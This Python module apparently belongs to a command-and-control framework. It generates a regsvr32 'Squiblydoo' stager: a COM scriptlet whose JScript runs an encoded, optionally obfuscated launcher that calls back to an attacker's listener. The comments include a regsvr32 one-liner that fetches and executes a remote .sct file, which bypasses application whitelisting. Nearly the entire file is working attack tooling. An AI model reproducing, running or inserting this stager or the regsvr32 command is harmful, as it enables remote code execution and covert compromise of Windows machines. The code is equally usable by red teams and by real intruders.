import logging

log = logging.getLogger(__name__)


class Stager:
    def __init__(self, mainMenu):
        self.info = {
            "Name": "regsvr32",
            "Authors": [
                {
                    "Name": "",
                    "Handle": "@subTee",
                    "Link": "",
                },
                {
                    "Name": "",
                    "Handle": "@enigma0x3",
                    "Link": "",
                },
            ],
            "Description": "Generates an sct file (COM Scriptlet) Host this anywhere",
            "Comments": [
                "On the endpoint simply launch regsvr32 /u /n /s /i:http://server/file.sct scrobj.dll "
            ],
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            "Listener": {
                "Description": "Listener to generate stager for.",
                "Required": True,
                "Value": "",
            },
            "Language": {
                "Description": "Language of the stager to generate.",
                "Required": True,
                "Value": "powershell",
                "SuggestedValues": ["powershell", "ironpython", "csharp"],
                "Strict": True,
            },
            "StagerRetries": {
                "Description": "Times for the stager to retry connecting.",
                "Required": False,
                "Value": "0",
            },
            "Base64": {
                "Description": "Switch. Base64 encode the output.",
                "Required": True,
                "Value": "True",
                "SuggestedValues": ["True", "False"],
                "Strict": True,
            },
            "Obfuscate": {
                "Description": "Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.",
                "Required": False,
                "Value": "False",
                "SuggestedValues": ["True", "False"],
                "Strict": True,
            },
            "ObfuscateCommand": {
                "Description": "The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.",
                "Required": False,
                "Value": r"Token\All\1",
            },
            "OutFile": {
                "Description": "Filename that should be used for the generated output.",
                "Required": False,
                "Value": "launcher.sct",
            },
            "UserAgent": {
                "Description": "User-agent string to use for the staging request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "Proxy": {
                "Description": "Proxy to use for request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "ProxyCreds": {
                "Description": r"Proxy credentials ([domain\]username:password) to use for request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

    def generate(self):
        # extract all of our options
        language = self.options["Language"]["Value"]
        listener_name = self.options["Listener"]["Value"]
        base64 = self.options["Base64"]["Value"]
        obfuscate = self.options["Obfuscate"]["Value"]
        obfuscate_command = self.options["ObfuscateCommand"]["Value"]
        user_agent = self.options["UserAgent"]["Value"]
        proxy = self.options["Proxy"]["Value"]
        proxy_creds = self.options["ProxyCreds"]["Value"]
        stager_retries = self.options["StagerRetries"]["Value"]

        encode = False
        if base64.lower() == "true":
            encode = True

        obfuscate_script = False
        if obfuscate.lower() == "true":
            obfuscate_script = True

        if language in ["csharp", "ironpython"]:
            if (
                self.mainMenu.listenersv2.get_active_listener_by_name(
                    listener_name
                ).info["Name"]
                != "HTTP[S]"
            ):
                log.error(
                    "Only HTTP[S] listeners are supported for C# and IronPython stagers."
                )
                return ""

            launcher = self.mainMenu.stagers.generate_exe_oneliner(
                language=language,
                obfuscate=obfuscate_script,
                obfuscation_command=obfuscate_command,
                encode=encode,
                listener_name=listener_name,
            )

        elif language == "powershell":
            launcher = self.mainMenu.stagers.generate_launcher(
                listenerName=listener_name,
                language=language,
                encode=encode,
                obfuscate=obfuscate_script,
                obfuscation_command=obfuscate_command,
                userAgent=user_agent,
                proxy=proxy,
                proxyCreds=proxy_creds,
                stagerRetries=stager_retries,
            )

        if launcher == "":
            log.error("[!] Error in launcher command generation.")
            return ""

        code = '<?XML version="1.0"?>\n'
        code += "<scriptlet>\n"
        code += "<registration\n"
        code += 'description="Win32COMDebug"\n'
        code += 'progid="Win32COMDebug"\n'
        code += 'version="1.00"\n'
        code += 'classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"\n'
        code += " >\n"
        code += ' <script language="JScript">\n'
        code += "      <![CDATA[\n"
        code += (
            '           var r = new ActiveXObject("WScript.Shell").Run(\''
            + launcher.replace("'", "\\'")
            + "');\n"
        )
        code += "      ]]>\n"
        code += " </script>\n"
        code += "</registration>\n"
        code += "<public>\n"
        code += '    <method name="Exec"></method>\n'
        code += "</public>\n"
        code += "</scriptlet>\n"

        return code
